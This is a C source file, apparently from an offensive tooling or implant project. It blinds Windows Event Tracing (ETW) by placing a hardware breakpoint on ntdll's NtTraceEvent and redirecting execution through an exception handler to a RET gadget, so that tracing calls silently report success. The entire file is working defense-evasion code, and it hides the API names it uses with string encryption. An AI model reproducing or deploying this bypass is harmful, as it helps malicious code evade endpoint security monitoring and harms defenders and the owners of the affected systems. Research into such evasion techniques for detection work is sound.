/*
 * ETW Bypass via Hardware Breakpoints
 *
 * Sets HWBP on NtTraceEvent prologue and redirects execution to RET gadget.
 * Integrates with existing VEH handler in syscalls.cpp
 *
 * Advantages over memory patching:
 * - No memory modifications (cleaner)
 * - Reversible at runtime
 * - Uses existing VEH infrastructure
 *
 * RET Gadget Discovery:
 *   Parses PE section headers to identify executable regions, filters out
 *   writable/data sections, and validates page-level protections via
 *   NtQueryVirtualMemory to exclude PAGE_GUARD and PAGE_NOACCESS pages.
 */

#include "../include/etw_bypass.h"
#include "../include/resolver.h"
#include "../include/utils.h"
#include "../libs/bastia/bastia.h"

#include <windows.h>
#include <stdint.h>
#include <stdbool.h>

// =============================================================================
// Global ETW State
// =============================================================================

static ETW_BYPASS_STATE g_etwState = {0};
static functionTable* g_functionTable = NULL;

#ifdef _WIN64
    #define CTX_RIP(ctx) ((ctx)->Rip)
    #define CTX_RAX(ctx) ((ctx)->Rax)
#else
    #define CTX_RIP(ctx) ((ctx)->Eip)
    #define CTX_RAX(ctx) ((ctx)->Eax)
#endif

// =============================================================================
// ETW VEH Handler (called from main VEH in syscalls.cpp)
// =============================================================================

LONG ETW_HandleException(EXCEPTION_POINTERS* ExceptionInfo) {
    // Only handle if ETW is enabled
    if (!g_etwState.enabled || !g_etwState.ntTraceEventAddr) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    if (ExceptionInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    PCONTEXT ctx = ExceptionInfo->ContextRecord;

    // Check which DR register triggered
    DWORD_PTR dr0 = (DWORD_PTR)(ctx->Dr6 & 0xF);  // Debug status register
    
    // Check if HWBP hit on NtTraceEvent (we set it on DR1-3)
    if (g_etwState.drIndex >= 1 && g_etwState.drIndex <= 3) {
        DWORD_PTR drReg = 0;
        switch (g_etwState.drIndex) {
            case 1: drReg = (DWORD_PTR)ctx->Dr1; break;
            case 2: drReg = (DWORD_PTR)ctx->Dr2; break;
            case 3: drReg = (DWORD_PTR)ctx->Dr3; break;
        }

        if (drReg == (DWORD_PTR)g_etwState.ntTraceEventAddr && 
            (dr0 & (1 << g_etwState.drIndex))) {
            
            g_debugPrint("[ETW] HWBP hit on NtTraceEvent @ 0x%llX (DR%d)", 
                        (unsigned long long)CTX_RIP(ctx), g_etwState.drIndex);

            // Redirect to RET gadget (immediate return, RAX=0 for success)
            if (g_etwState.retGadget) {
                CTX_RIP(ctx) = (DWORD_PTR)g_etwState.retGadget;
                CTX_RAX(ctx) = 0;  // NT_SUCCESS
                
                // Clear single-step flag and debug status
                ctx->EFlags &= ~(1 << 8);  // Clear TF
                ctx->Dr6 = 0;  // Clear debug status
                
                g_debugPrint("[ETW] Redirected to RET @ 0x%llX", 
                            (unsigned long long)CTX_RIP(ctx));
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

// =============================================================================
// Helper Functions
// =============================================================================

/*
 * Find a RET (0xC3) gadget within ntdll's executable sections.
 *
 * Walks PE section headers, selects only RX sections (no WRITE),
 * validates each page via NtQueryVirtualMemory to skip PAGE_GUARD
 * and PAGE_NOACCESS pages, then scans for 0xC3.
 */
static void* FindRetGadget(functionTable* funcTable) {
    HMODULE ntdll = GetModuleBaseAddress(lcg_encryptw(L"ntdll.dll"));
    if (!ntdll) return NULL;

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)ntdll;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

#ifdef _WIN64
    IMAGE_NT_HEADERS64* ntHeaders = (IMAGE_NT_HEADERS64*)((BYTE*)ntdll + dosHeader->e_lfanew);
#else
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)ntdll + dosHeader->e_lfanew);
#endif
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);
    WORD numSections = ntHeaders->FileHeader.NumberOfSections;

    for (WORD i = 0; i < numSections; i++) {
        DWORD chars = sections[i].Characteristics;

        /* Only executable, readable, non-writable sections */
        if (!(chars & IMAGE_SCN_CNT_CODE)) continue;
        if (!(chars & IMAGE_SCN_MEM_EXECUTE)) continue;
        if (!(chars & IMAGE_SCN_MEM_READ)) continue;
        if (chars & IMAGE_SCN_MEM_WRITE) continue;

        BYTE* sectionStart = (BYTE*)ntdll + sections[i].VirtualAddress;
        DWORD sectionSize = sections[i].Misc.VirtualSize;
        if (sectionSize == 0) continue;

        BYTE* scanEnd = sectionStart + sectionSize;

        /* Walk the section page-by-page (4KB granularity) */
        BYTE* pageBase = sectionStart;
        while (pageBase < scanEnd) {
            MEMORY_BASIC_INFORMATION mbi;
            NTSTATUS status = funcTable->NtQueryVirtualMemory(
                NtCurrentProcess(),
                (PVOID)pageBase,
                MemoryBasicInformation,
                &mbi,
                sizeof(mbi),
                NULL
            );

            /* If we can't query, skip - don't blindly trust section headers */
            if (!NT_SUCCESS(status) || mbi.RegionSize == 0) {
                pageBase += 0x1000;
                continue;
            }

            DWORD prot = mbi.Protect;

            /* Skip PAGE_NOACCESS and PAGE_GUARD pages */
            if (prot == PAGE_NOACCESS) {
                pageBase = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
                continue;
            }
            if (prot & PAGE_GUARD) {
                pageBase = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
                continue;
            }

            /* Page must be executable */
            if (prot != PAGE_EXECUTE &&
                prot != PAGE_EXECUTE_READ &&
                prot != PAGE_EXECUTE_READWRITE) {
                pageBase = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
                continue;
            }

            /* Scan this page for RET */
            BYTE* pageEnd = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
            /* Clamp to section boundary */
            if (pageEnd > scanEnd) pageEnd = scanEnd;

            for (BYTE* p = pageBase; p < pageEnd; p++) {
                if (*p == 0xC3) {
                    g_debugPrint("[ETW] RET gadget found @ 0x%p in section '%s'",
                                p, sections[i].Name);
                    return (void*)p;
                }
            }

            pageBase = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
        }
    }

    g_debugPrint("[ETW] No RET gadget found in ntdll executable sections");
    return NULL;
}

// =============================================================================
// Public API
// =============================================================================

bool ETW_Enable(functionTable* funcTable) {
    if (g_etwState.enabled) {
        g_debugPrint("[ETW] Already enabled");
        return true;
    }

    if(!g_functionTable) {
        g_functionTable = funcTable;
    }

    // Get NtTraceEvent address
    HMODULE ntdll = GetModuleBaseAddress(lcg_encryptw(L"ntdll.dll"));
    if (!ntdll) {
        g_debugPrint("[ETW] Failed to get ntdll base");
        return false;
    }

    g_etwState.ntTraceEventAddr = (PVOID)GetSymbolAddress(
        (uint64_t)ntdll,
        lcg_encrypt("NtTraceEvent")
    );

    if (!g_etwState.ntTraceEventAddr) {
        g_debugPrint("[ETW] Failed to resolve NtTraceEvent");
        return false;
    }

    g_debugPrint("[ETW] NtTraceEvent @ 0x%p", g_etwState.ntTraceEventAddr);

    // Find RET gadget (section-aware, excludes guards/NO_ACCESS)
    g_etwState.retGadget = FindRetGadget(funcTable);
    if (!g_etwState.retGadget) {
        g_debugPrint("[ETW] Failed to find RET gadget");
        return false;
    }

    g_debugPrint("[ETW] RET gadget @ 0x%p", g_etwState.retGadget);

    // Get current thread context
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!funcTable->GetThreadContext(NtCurrentThread(), &ctx)) {
        g_debugPrint("[ETW] GetThreadContext failed");
        return false;
    }

    // Find available DR register (prefer DR1, DR2, DR3 to avoid DR0 used by syscalls)
    int drIndex = -1;
    if (!(ctx.Dr7 & (1 << 2))) drIndex = 1;  // DR1 available
    else if (!(ctx.Dr7 & (1 << 4))) drIndex = 2;  // DR2 available
    else if (!(ctx.Dr7 & (1 << 6))) drIndex = 3;  // DR3 available

    if (drIndex < 0) {
        g_debugPrint("[ETW] No available HWBP registers (DR1-3 all in use)");
        return false;
    }

    g_debugPrint("[ETW] Using DR%d for ETW bypass", drIndex);

    // Set HWBP on NtTraceEvent
    switch (drIndex) {
        case 1: ctx.Dr1 = (DWORD_PTR)g_etwState.ntTraceEventAddr; break;
        case 2: ctx.Dr2 = (DWORD_PTR)g_etwState.ntTraceEventAddr; break;
        case 3: ctx.Dr3 = (DWORD_PTR)g_etwState.ntTraceEventAddr; break;
    }

    // Enable local breakpoint (L1/L2/L3)
    ctx.Dr7 |= (1 << (drIndex * 2));
    
    // Condition: execute only (R/W = 00)
    ctx.Dr7 &= ~(3 << (16 + drIndex * 4));
    
    // Length: 1 byte (LEN = 00)
    ctx.Dr7 &= ~(3 << (18 + drIndex * 4));

    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!funcTable->SetThreadContext(NtCurrentThread(), &ctx)) {
        g_debugPrint("[ETW] SetThreadContext failed");
        return false;
    }

    g_etwState.enabled = true;
    g_etwState.drIndex = drIndex;
    g_debugPrint("[ETW] ETW bypass ENABLED");

    return true;
}

bool ETW_Disable(void) {
    if (!g_etwState.enabled) {
        g_debugPrint("[ETW] Already disabled");
        return true;
    }

    if (!g_functionTable) {
        g_debugPrint("[ETW] NT function table not initialized");
        return false;
    }

    // Clear HWBP
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!g_functionTable->GetThreadContext(NtCurrentThread(), &ctx)) {
        g_debugPrint("[ETW] GetThreadContext failed");
        return false;
    }

    // Disable the breakpoint
    ctx.Dr7 &= ~(1 << (g_etwState.drIndex * 2));

    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!g_functionTable->SetThreadContext(NtCurrentThread(), &ctx)) {
        g_debugPrint("[ETW] SetThreadContext failed");
        return false;
    }

    g_etwState.enabled = false;
    g_etwState.drIndex = 0;
    g_debugPrint("[ETW] ETW bypass DISABLED");

    return true;
}

bool ETW_IsEnabled(void) {
    return g_etwState.enabled;
}

// Get current ETW state for VEH integration
ETW_BYPASS_STATE* ETW_GetState(void) {
    return &g_etwState;
}
